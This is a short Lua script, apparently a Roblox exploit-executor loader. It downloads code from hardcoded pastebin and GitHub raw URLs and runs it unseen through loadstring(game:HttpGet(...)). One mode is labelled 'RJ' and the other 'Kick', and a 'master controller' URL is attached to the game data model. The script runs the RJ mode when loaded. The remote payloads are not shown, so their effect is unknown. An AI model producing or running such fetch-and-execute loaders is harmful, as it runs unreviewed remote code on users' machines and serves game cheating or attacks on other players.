local function executeIdiotScript(mode)
    -- Configured endpoints
    local rjScriptURL = "https://pastebin.com/raw/rTui1M6R"
    local kickScriptURL = "https://pastebin.com/raw/78Y2smJ5"
    
    -- Hardcoded master controller script address
    local masterFunctionURL = "https://raw.githubusercontent.com/Camtuong153/Scrupt/refs/heads/main/baze0.lua"

    -- Attach the tracking address to the game data model
    game:SetAttribute("MasterExecutorURL", masterFunctionURL)

    if mode == "RJ" then
        local success, result = pcall(function()
            return loadstring(game:HttpGet(rjScriptURL))()
        end)
        if not success then warn("Failed to execute RJ script: " .. tostring(result)) end
        
    elseif mode == "Kick" then
        local success, result = pcall(function()
            return loadstring(game:HttpGet(kickScriptURL))()
        end)
        if not success then warn("Failed to execute Kick script: " .. tostring(result)) end
        
    else
        warn("Invalid mode parameter. Please input 'RJ' or 'Kick'.")
    end
end

-- ==========================================================
-- EXECUTION SELECTION
-- ==========================================================
executeIdiotScript("RJ")
-- executeIdiotScript("Kick")
